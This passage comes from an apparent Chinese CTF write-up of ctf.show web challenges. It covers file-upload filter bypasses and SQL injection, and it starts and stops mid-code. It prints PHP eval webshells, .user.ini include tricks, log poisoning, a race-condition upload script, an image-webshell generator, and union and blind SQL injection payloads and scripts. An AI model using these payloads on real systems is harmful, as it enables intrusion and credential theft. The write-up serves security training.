class="comment">------WebKitFormBoundarysSdVv9iA9wMCmOIg--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>

<p>然后上传png，如果没文件头检测，就直接传png里面一句话代码，否则要随便截个图，然后代码放最后。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: 1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 205</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: <span class="title">application</span>/<span class="title">json</span>, <span class="title">text</span>/<span class="title">javascript</span>, */*; <span class="title">q</span>=0.01</span></span><br><span class="line"><span class="function"><span class="title">X</span>-<span class="title">Requested</span>-<span class="title">With</span>: <span class="title">XMLHttpRequest</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">Macintosh</span>; <span class="title">Intel</span> <span class="title">Mac</span> <span class="title">OS</span> <span class="title">X</span> 10<span class="title">_15_7</span>) <span class="title">AppleWebKit</span>/537.36 (<span class="title">KHTML</span>, <span class="title">like</span> <span class="title">Gecko</span>) <span class="title">Chrome</span>/103.0.0.0 <span class="title">Safari</span>/537.36</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>; <span class="title">boundary</span>=----<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="function"><span class="title">Origin</span>: <span class="title">http</span>://1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span></span></span><br><span class="line"><span class="function"><span class="title">Referer</span>: <span class="title">http</span>://1<span class="title">a6d1184</span>-<span class="title">db8d</span>-4671-<span class="title">a858</span>-56<span class="title">d5451f64fd.challenge.ctf.show</span>/</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Encoding</span>: <span class="title">gzip</span>, <span class="title">deflate</span></span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">zh</span>-<span class="title">CN</span>,<span class="title">zh</span>;<span class="title">q</span>=0.9</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Disposition</span>: <span class="title">form</span>-<span class="title">data</span>; <span class="title">name</span>=&quot;<span class="title">file</span>&quot;; <span class="title">filename</span>=&quot;1.<span class="title">png</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">image</span>/<span class="title">png</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span> <span class="title">eval</span>($<span class="title">_POST</span>[&#x27;<span class="title">x</span>&#x27;]);?&gt;</span></span><br><span class="line"><span class="function">------<span class="title">WebKitFormBoundarysSdVv9iA9wMCmOIg</span>--</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h4><span id="web156">web156</span></h4><blockquote>
<p>[]可以用{}来绕过，</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4><span id="web157">web157</span></h4><p>经过测试发现过滤掉了大括号{}，[]，；</p>
<p>所以可以说这样基本把马给锁死了，但是我们可以任意执行php，就用系统命令查看一下，直接找到flag文件</p>
<h4><span id="web-159">web 159</span></h4><p>本题过滤掉了</p>
<blockquote>
<p>php</p>
<p>{}</p>
<p>[]</p>
<p>;</p>
<p>()</p>
</blockquote>
<p>所以就无法调用所有的函数了，但是能利用php特性，命令执行可以用&#96;&#96;（反引号包涵）</p>
<blockquote>
<?=`nl ../fl*`?>
</blockquote>
<h4><span id="web-160">web 160</span></h4><p>与上题相比，这题将空格和&#96;&#96;反引号和log过滤掉了，所以上传的时候要注意略过多余的空格，log可以用点号拼接绕过，且本题不能使用上题的方法，考虑到日志包含。</p>
<p>首先上传<code>.user.ini</code></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=/var/www/html/upload/<span class="number">1</span>.png</span><br><span class="line">// 或者</span><br><span class="line">auto_prepend_file=<span class="number">1</span>.png</span><br></pre></td></tr></table></figure>

<p>nginx的日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log里头，先看看日志文件有什么，这里上传内容为</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 绕过检查</span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>UA改为</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<h4><span id="web162">web162</span></h4><p>大致思路和上题类似,不过在上传.user.ini的时候发现<code>.</code>被过滤了,可以把包含的文件不带后缀来绕过</p>
<p><strong>包含文件法</strong></p>
<ul>
<li>.user.ini</li>
</ul>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line"><span class="attr">auto_prepend_file</span>=png</span><br></pre></td></tr></table></figure>

<ul>
<li>png</li>
<li>取反脚本</li>
</ul>
<p><strong>包含session，条件竞争</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;abc&#x27;</span> <span class="comment">#之前上传时自拟的名字</span></span><br><span class="line">url1 = <span class="string">&quot;http://2c61d1a6-5b2d-4d20-8367-9d9b9875e436.chall.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://2c61d1a6-5b2d-4d20-8367-9d9b9875e436.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;yu22x tql&#x27;</span>  <span class="comment">#文件名，随便改就行</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(): <span class="comment">#上传文件竞争过程</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment">#每次竞争完都访问一下url/uoload看有没有flag</span></span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag=re.<span class="built_in">compile</span>(<span class="string">&#x27;ctfshow&#123;.+&#125;&#x27;</span>) <span class="comment">#我在做题的时候flag格式已经改成ctfshow&#123;&#125;了</span></span><br><span class="line">            <span class="built_in">print</span>(flag.findall(r.text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<h4><span id="web-164">web 164</span></h4><p><a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">图片木马</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/744001fd0738">二次渲染原理</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>); <span class="comment">#保存在本地的图片马</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?=$_GET[0]($_POST[1]);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后通过bp去访问图片</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/download.php?image=4a47a0db6e60853dedfcfdf08a5ca249.png&amp;0=system</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>113f313e-076e-4fc6-9c58-07e68e75cc22.challenge.ctf.show</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://113f313e-076e-4fc6-9c58-07e68e75cc22.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">1</span>=tac f*</span></span><br></pre></td></tr></table></figure>



<h3><span id="sql-注入">SQL 注入</span></h3><p><strong>知识点</strong></p>
<ul>
<li><code>%23 </code>相当于 # 可以注释后面的语句，同理<code> --+</code>也代表注释</li>
</ul>
<h4><span id="web171">web171</span></h4><p>查询语句如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>查数据库名：</p>
<ul>
<li>-1 是为了查询不在表中的数据，使得只显示我们需要的数据</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;u</span>nion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() --+</span><br></pre></td></tr></table></figure>

<p>查表名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow_web&quot; --+</span></span><br></pre></td></tr></table></figure>

<p>查列名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;ctfshow_user&quot; --+</span></span><br></pre></td></tr></table></figure>

<p>爆字段：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;u</span>nion <span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user --+</span><br></pre></td></tr></table></figure>

<h4><span id="web172">web172</span></h4><p>用户名是flag则不给输出</p>
<ul>
<li><p>方法一：直接使用其他字段代替username</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,password from ctfshow_user2 where username =&#x27;</span>flag<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,password <span class="keyword">from</span> ctfshow_user2 <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,password from ctfshow_user2 where username =&#x27;</span>flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：使用to_base64、hex等等方法加密username</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select to_base64(username),password from ctfshow_user2  --+</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="web174">web174</span></h4><ul>
<li><p>方法一：替换</p>
<p>返回逻辑判断了不能包含数字和flag，因此我们可以先base64编码，再对数字进行替换。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>numA<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>numB<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>numC<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>numD<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>numE<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>numF<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>numG<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>numH<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>numI<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>numJ<span class="string">&#x27;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>numA<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>numB<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>numC<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>numD<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>numE<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>numF<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>numG<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>numH<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>numI<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>numJ<span class="string">&#x27;) from ctfshow_user4 where username=&#x27;</span>flag<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p>然后对爆出的字符串反向替换以下就行了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;YnumCRmcnumBhvdnumCsnumCOTknumEMDdkNynumAhMWIxLTRiYzQtOTEnumJYinumJnumCMWJiZTBlNjFhZTRnumI&quot;</span></span><br><span class="line">flag=flagstr.replace(<span class="string">&#x27;numA&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;numB&#x27;</span>,<span class="string">&#x27;2&#x27;</span>).replace(<span class="string">&#x27;numC&#x27;</span>,<span class="string">&#x27;3&#x27;</span>).replace(<span class="string">&#x27;numD&#x27;</span>,<span class="string">&#x27;4&#x27;</span>).replace(<span class="string">&#x27;numE&#x27;</span>,<span class="string">&#x27;5&#x27;</span>).replace(<span class="string">&#x27;numF&#x27;</span>,<span class="string">&#x27;6&#x27;</span>).replace(<span class="string">&#x27;numG&#x27;</span>,<span class="string">&#x27;7&#x27;</span>).replace(<span class="string">&#x27;numH&#x27;</span>,<span class="string">&#x27;8&#x27;</span>).replace(<span class="string">&#x27;numI&#x27;</span>,<span class="string">&#x27;9&#x27;</span>).replace(<span class="string">&#x27;numJ&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>

<p>或者用其他符号代替</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;)&#x27;</span>),<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;(&#x27;</span>),<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;*&#x27;</span>),<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>),<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;^&#x27;</span>),<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;%&#x27;</span>),<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;$&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;#&#x27;</span>),<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;@&#x27;</span>),<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"># &quot;a1b2c3d4e5&quot; <span class="operator">=</span><span class="operator">&gt;</span> &quot;a!b@c3d4e5&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：盲注</p>
<blockquote>
<p>flag格式ctfshow{xxxxxxxx(8)-xxxx(4)-xxxx(4)-xxxx(4)-xxxxxxxxxxxx(12)}<br>其中每个 x 是 0-9 或 a-f 范围内的一个十六进制的数字。</p>
</blockquote>
<p>代码中使用注释“&#x2F;**&#x2F;”将空格替换掉，以避免URL编码可能导致的问题。</p>
<ul>
<li><p>布尔盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://b1c54244-c67c-41e9-80af-c6c916ee3cf2.challenge.ctf.show//api/v4.php?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">uuid=string.ascii_lowercase+<span class="string">&quot;-&#125;&#123;&quot;</span>+string.digits</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:	    </span><br><span class="line">        payload = <span class="string">&quot;and ascii(substr((select group_concat(password) from ctfshow_user4 where username=&#x27;flag&#x27;) from &#123;0&#125; for 1))=&#123;1&#125;--%20&amp;page=1&amp;limit=10&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>).<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>trim盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://b1c54244-c67c-41e9-80af-c6c916ee3cf2.challenge.ctf.show/api/v4.php?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">uuid=string.ascii_lowercase+<span class="string">&quot;-&#125;&#123;&quot;</span>+string.digits</span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:	    </span><br><span class="line">        payload = <span class="string">f&quot;and trim(leading &#x27;<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;j&#125;</span>&#x27; from (select group_concat(password) from ctfshow_user4 where username = &#x27;flag&#x27;))=trim(leading &#x27;<span class="subst">&#123;flag&#125;</span>.&#x27; from (select group_concat(password) from ctfshow_user4 where username = &#x27;flag&#x27;))--%20&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> 